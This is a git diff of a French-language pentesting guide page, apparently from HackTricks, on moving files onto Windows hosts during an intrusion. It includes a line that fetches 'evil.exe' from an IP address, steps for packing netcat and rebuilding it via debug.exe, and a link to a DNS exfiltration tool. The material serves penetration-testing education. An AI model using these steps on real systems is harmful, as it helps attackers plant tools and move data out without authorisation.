@@ -296,14 +296,18 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Le programme `debug.exe` permet non seulement d'inspecter des binaires mais a également la **capacité de les reconstruire à partir de l'hex**. Cela signifie qu'en fournissant un hex d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation d'assemblage des fichiers jusqu'à 64 ko de taille**.
+Le programme `debug.exe` permet non seulement l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hex**. Cela signifie qu'en fournissant un hex d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation d'assemblage des fichiers jusqu'à 64 ko**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.exe sera créé.
+Ensuite, collez le texte dans le shell Windows et un fichier appelé nc.exe sera créé.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
